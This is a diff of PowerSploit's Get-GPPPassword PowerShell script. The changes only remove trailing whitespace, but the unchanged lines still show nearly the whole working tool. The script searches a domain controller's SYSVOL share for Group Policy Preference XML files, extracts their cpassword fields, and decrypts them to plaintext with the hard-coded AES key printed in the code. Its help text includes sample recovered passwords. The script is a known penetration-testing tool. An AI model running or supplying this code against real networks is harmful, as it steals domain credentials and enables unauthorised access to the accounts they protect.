@@ -1,4 +1,4 @@
-function Get-GPPPassword 
+function Get-GPPPassword
 {
 <#
 .SYNOPSIS
@@ -12,7 +12,7 @@ function Get-GPPPassword
     Required Dependencies: None
     Optional Dependencies: None
     Version: 2.4.3
- 
+
 .DESCRIPTION
 
     Get-GPPPassword searches the domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.
@@ -20,7 +20,7 @@ function Get-GPPPassword
 .EXAMPLE
 
     PS C:\> Get-GPPPassword
-    
+
     NewName   : [BLANK]
     Changed   : {2014-02-21 05:28:53}
     Passwords : {password12}
@@ -48,7 +48,7 @@ function Get-GPPPassword
 .EXAMPLE
 
     PS C:\> Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq
-    
+
     password
     password12
     password123
@@ -58,30 +58,30 @@ function Get-GPPPassword
     Recycling*3ftw!
 
 .LINK
-    
+
     http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
     https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
     http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
     http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
 #>
-    
+
     [CmdletBinding()]
     Param ()
-    
+
     #Some XML issues between versions
     Set-StrictMode -Version 2
-    
+
     #define helper function that decodes and decrypts password
     function Get-DecryptedCpassword {
         [CmdletBinding()]
         Param (
-            [string] $Cpassword 
+            [string] $Cpassword
         )
 
         try {
-            #Append appropriate padding based on string length  
+            #Append appropriate padding based on string length
             $Mod = ($Cpassword.length % 4)
-            
+
             switch ($Mod) {
             '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
             '2' {$Cpassword += ('=' * (4 - $Mod))}
@@ -89,34 +89,34 @@ function Get-GPPPassword
             }
 
             $Base64Decoded = [Convert]::FromBase64String($Cpassword)
-            
+
             #Create a new AES .NET Crypto Object
             $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
             [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                  0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
-            
+
             #Set IV to all nulls to prevent dynamic generation of IV value
-            $AesIV = New-Object Byte[]($AesObject.IV.Length) 
+            $AesIV = New-Object Byte[]($AesObject.IV.Length)
             $AesObject.IV = $AesIV
             $AesObject.Key = $AesKey
-            $DecryptorObject = $AesObject.CreateDecryptor() 
+            $DecryptorObject = $AesObject.CreateDecryptor()
             [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
-            
+
             return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
-        } 
-        
+        }
+
         catch {Write-Error $Error[0]}
-    }  
-    
+    }
+
     #define helper function to parse fields from xml files
     function Get-GPPInnerFields {
     [CmdletBinding()]
         Param (
-            $File 
+            $File
         )
-    
+
         try {
-            
+
             $Filename = Split-Path $File -Leaf
             [xml] $Xml = Get-Content ($File)
 
@@ -126,12 +126,12 @@ function Get-GPPPassword
             $NewName = @()
             $Changed = @()
             $Password = @()
-    
+
             #check for password field
             if ($Xml.innerxml -like "*cpassword*"){
-            
+
                 Write-Verbose "Potential password in $File"
-                
+
                 switch ($Filename) {
 
                     'Groups.xml' {
@@ -140,13 +140,13 @@ function Get-GPPPassword
                         $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                     }
-        
-                    'Services.xml' {  
+
+                    'Services.xml' {
                         $Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                     }
-        
+
                     'Scheduledtasks.xml' {
                         $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/TaskV2/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
@@ -155,27 +155,27 @@ function Get-GPPPassword
                         $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $Changed += , $Xml | Select-Xml "/ScheduledTasks/TaskV2/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                     }
-        
-                    'DataSources.xml' { 
+
+                    'DataSources.xml' {
                         $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
+                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                     }
-                    
-                    'Printers.xml' { 
+
+                    'Printers.xml' {
                         $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                     }
-  
-                    'Drives.xml' { 
+
+                    'Drives.xml' {
                         $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
+                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                     }
                 }
            }
-                     
+
            foreach ($Pass in $Cpassword) {
                Write-Verbose "Decrypting $Pass"
                $DecryptedPassword = Get-DecryptedCpassword $Pass
@@ -183,28 +183,28 @@ function Get-GPPPassword
                #append any new passwords to array
                $Password += , $DecryptedPassword
            }
-            
+
             #put [BLANK] in variables
             if (!($Password)) {$Password = '[BLANK]'}
             if (!($UserName)) {$UserName = '[BLANK]'}
             if (!($Changed)) {$Changed = '[BLANK]'}
             if (!($NewName)) {$NewName = '[BLANK]'}
-                  
+
             #Create custom object to output results
             $ObjectProperties = @{'Passwords' = $Password;
                                   'UserNames' = $UserName;
                                   'Changed' = $Changed;
                                   'NewName' = $NewName;
                                   'File' = $File}
-                
+
             $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
             Write-Verbose "The password is between {} and may be more than one value."
-            if ($ResultsObject) {Return $ResultsObject} 
+            if ($ResultsObject) {Return $ResultsObject}
         }
 
         catch {Write-Error $Error[0]}
     }
-    
+
     try {
         #ensure that machine is domain joined and script is running as a domain account
         if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
@@ -220,11 +220,11 @@ function Get-GPPPassword
             #discover potential files containing passwords ; not complaining in case of denied access to a directory
             $XMlFiles += Get-ChildItem -Path "\\$DomainController\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'
         }
-        
+
         if ( -not $XMlFiles ) {throw 'No preference files found.'}
 
         Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
-    
+
         foreach ($File in $XMLFiles) {
             $Result = (Get-GppInnerFields $File.Fullname)
             Write-Output $Result
